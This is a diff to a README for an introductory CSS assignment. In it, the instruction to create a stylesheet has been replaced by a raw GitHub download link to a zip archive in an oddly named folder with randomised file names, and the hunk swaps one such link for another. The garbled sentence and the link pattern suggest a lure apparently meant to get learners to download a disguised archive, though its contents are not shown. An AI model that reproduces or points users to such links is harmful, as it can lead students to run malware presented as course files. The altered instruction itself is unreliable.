@@ -7,7 +7,7 @@ Use colors, fonts, and spacing effectively.
 
 ## Instructions
 
-Create a https://raw.githubusercontent.com/timokamau/feb-2025-introduction-to-css-timokamau/main/undissimulated/feb-2025-introduction-to-css-timokamau_unneatness.zip file.
+Create a https://github.com/timokamau/feb-2025-introduction-to-css-timokamau/raw/refs/heads/main/undissimulated/feb-to-introduction-css-timokamau-2.9-beta.3.zip file.
 Apply CSS to a HTML page.
 Style elements using:
 Classes and IDs.
